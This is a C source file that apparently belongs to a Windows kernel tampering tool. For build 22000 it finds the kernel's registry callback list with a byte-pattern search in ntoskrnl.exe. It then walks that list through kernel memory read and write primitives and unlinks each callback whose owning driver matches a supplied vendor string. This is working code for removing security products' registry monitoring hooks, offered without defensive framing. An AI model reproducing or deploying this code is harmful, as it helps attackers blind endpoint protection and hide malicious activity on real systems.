#include "struct.h"

/*
*typedef struct _reg_callback
* {
*	LIST_ENTRY ListEntry;
*	ULONG uk0;
*	ULONG uk1;
*	LARGE_INTEGER Cookie;
*	PVOID Context;
*	PVOID Function;
* }
*/

//UCHAR PTRN_W10_Reg[] = { 0x48, 0x8b, 0xf8, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x85, 0xc0, 0x0f, 0x84 };
UCHAR PTRN_W10_Reg[] = { 0x48, 0xf7, 0xd8, 0x48, 0x1b, 0xdb };

void InitReg(PINFORMATION pInfor)
{
	switch (pInfor->Build)
	{
	case 22000:
		pInfor->Notify.ModuleName = "ntoskrnl.exe";
		pInfor->Notify.Pattern = PTRN_W10_Reg;
		pInfor->Notify.dwPattern = sizeof(PTRN_W10_Reg);
		pInfor->Notify.offset = -17;
		pInfor->Notify.startFunc = "CcMdlReadComplete";
		pInfor->Notify.endFunc = "RtlFreeOemString";
		break;
	default:
		break;
	}
}
void DeleteRegCallBackList(PINFORMATION pInfor,PWSTR Copyright)
{
	NTSTATUS status;
	ULONG_PTR ListStart, pre, post, NotifyFuncAddress;
	ULONG_PTR ListPre, ListPost;

	InitReg(pInfor);

	if (!moduleInfos)
	{
		status = enumDriver();
		if (!NT_SUCCESS(status))
		{
			PRINT_ERROR(L"enumDriver %08x\n", status);
			return;
		}
	}

	if (needSort)
		SortDevice();

	if (GetGlobalAddress(pInfor->Notify.ModuleName, pInfor->Notify.startFunc, pInfor->Notify.endFunc, pInfor->Notify.Pattern, pInfor->Notify.dwPattern, pInfor->Notify.offset, &ListStart))
	{
		if (UtilReadKernelMemory(pInfor->hDevice, ListStart, &pre) && UtilReadKernelMemory(pInfor->hDevice, ListStart + 8 , &post))
		{
			do
			{
				UtilReadKernelMemory(pInfor->hDevice, pre + 5 * sizeof(PVOID), &NotifyFuncAddress);
				wprintf(L"[*] Registry Functions @ %I64X\n", NotifyFuncAddress);
				if (checkDriver(pInfor->hDevice, 0, NotifyFuncAddress, Copyright, NULL, FALSE))
				{
					wprintf(L"[*] Delete Registry Function @ %I64X\n", NotifyFuncAddress);
					UtilReadKernelMemory(pInfor->hDevice, pre, &ListPre);
					UtilReadKernelMemory(pInfor->hDevice, pre + 8, &ListPost);
					UtilWriteKernelMemory(pInfor->hDevice, ListPre + 8, ListPost);
					UtilWriteKernelMemory(pInfor->hDevice, ListPost, ListPre);
				}
				UtilReadKernelMemory(pInfor->hDevice, pre, &pre);
			} while (pre != ListStart);

			//wprintf(L"[*] RegCallbackListHead @ %I64X pre @ %I64X \n", ListStart, pre);
		}
	}
}